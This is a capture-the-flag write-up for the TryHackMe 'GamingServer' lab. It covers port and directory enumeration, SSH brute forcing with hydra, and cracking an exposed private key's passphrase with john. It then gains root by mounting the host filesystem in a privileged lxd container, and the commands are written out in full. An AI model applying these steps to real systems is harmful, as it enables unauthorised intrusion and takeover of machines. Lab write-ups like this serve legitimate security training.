# THM: GamingServer

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="../../images/write_ups/try_hack_me/gaming_server/gaming_server.jpeg" alt="GamingServer" width="90"/> |
| Room | GamingServer |
| URL | [https://tryhackme.com/room/cowboyhacker](https://tryhackme.com/room/gamingserver) |
| Difficulty | Easy |

## Concepts/Tools Used

- [gobuster](../../tools/gobuster.md)
- [hydra](../../tools/hydra.md)
- wget
- [john](../../tools/john.md)
- lxd

## Room Description

An Easy Boot2Root box for beginners.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:
```bash
$ nmap -T4 -n -sC -sV -Pn -v -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-06-25 14:28 BST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating ARP Ping Scan at 14:29
Scanning target.thm (10.10.29.122) [1 port]
Completed ARP Ping Scan at 14:29, 0.03s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 14:29
Scanning target.thm (10.10.29.122) [65535 ports]
Discovered open port 80/tcp on 10.10.29.122
Discovered open port 22/tcp on 10.10.29.122
Completed SYN Stealth Scan at 14:29, 1.28s elapsed (65535 total ports)
Initiating Service scan at 14:29
Scanning 2 services on target.thm (10.10.29.122)
Completed Service scan at 14:29, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.29.122.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.27s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.01s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Nmap scan report for target.thm (10.10.29.122)
Host is up (0.00019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
MAC Address: 02:18:00:64:DD:0F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Initiating NSE at 14:29
Completed NSE at 14:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.35 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

SSH allows password login attempts. I start to check the site on port 80.

Inspecting http://target.thm/ has an interesting comment in html:
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->

It looks like I found a username. I check the robots.txt file and it shows the following:

```bash
user-agent: *
Allow: /
/uploads/
```

The uploads directory has a dictionary file dict.lst, I download it using the following command:

```bash
$ wget http://target.thm/dict.lst
```

Since I have a username and a dictionary, I try both on the ssh service for this machine using hydra. Here is the command I ran:

```bash
$ hydra -l john -P dict.lst target.thm ssh
```

That yield nothing.

I ran gobuster to find more directories on the server. Here is the command I ran:

```bash
$ gobuster dir -u http://target.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 310] [--> http://target.thm/uploads/]
/secret               (Status: 301) [Size: 309]
```

The /secret directory has a single file called secretKey. It is a private rsa key. I download it using the following command:

```bash
$ wget http://target.thm/secret/secretKey
```

Since this is a private rsa key I change the permission to private read/write so I won't get a warning each time I use this. Here is the command I used to fix the permissions:

```bash
$ chmod 600 secretKey
```

I try to ssh into the machine with this key but it wants a passphrase for the key. Here is what I used to ssh with the key:

```bash
$ ssh john@target.thm -i secretKey
```

## Getting a Foothold

Since I don't have a passphrase for the ssh key, I'll need to crack it. I download ssh2john.py with the following command:

```bash
$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
```

This programe will turn the ssh key into a format that john can understand. I run the following and save the hash as john_ssh:

```bash
$ python3 ssh2john.py secretKey > john_ssh
```

Now I have john crack the passphrase with the following command:

```bash
$ john --wordlist=dict.lst john_ssh
```

This gives me passphrase to crack the ssh key. I run the following command again to log into the server and type in the passphrase when asked:

```bash
$ ssh john@target.thm -i secretKey
```

I have a shell. I'm in!

## Privilege Escalation

I ran my [usual list of commands](../../README.md#linux-privilege-escalation). Running groups did yield some interesting results:

```bash
$ groups
john adm cdrom sudo dip plugdev lxd
```

The user john is a member of the sudo group and if I had his password I could juse run sudo su and this would be all over. I don't know the password so I examine the other groups. The lxd group is interesting. I wasn't familiar with it but lxd is very similar to docker.

I found out that I can run a lxc (which is a container) that will have escalated privileges and allow me to mount the hard drive of my machine. In other words, I can be the root user and mount my drive so that I have a root user on my drive.

First things first, I need to grab a lxc container on my attack machine so that I can download it on my target machine. I run the following commands to download the lxc container and start a python http server so that my target machine can download it. Here are the commands I ran on my attack machine:

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ python3 -m http.server
```

Now I am going to download what I need from attack machine onto the target machine. Here are the command I used:

```bash
$ wget http://<attack_machine_ip>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Now I need to add the image to lxc and give it an alias. I run the following:

```bash
$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```

I check to make sure it got added, by running the following command:

```bash
$ lxc image list
```

I need to mark that image with privilege escalation. So I create a container called ignite and give it escalated privileges. I run the following:

```bash
$ lxc init myimage ignite -c security.privileged=true
```

Now I have a container named ignite. I wasn to mount my hard drive to that container. I name the mount mydevice. Here is the command I ran:

```bash
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```

This means that I can see the target hard drive in the container when I go to the /mnt/root/ directory. In other words, the /mnt/root directory in the container will be the / directory on the target machine.

Now I start the ignite container with the following command:

```bash
$ lxc start ignite
```

I log into the machine with a shell using the following command:

```bash
$ lxc exec ignite /bin/sh
```

## What is the root flag?

It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following commands to get the flag:

```bash
# cd /mnt/root/root
# cat root.txt
REDACTED
```
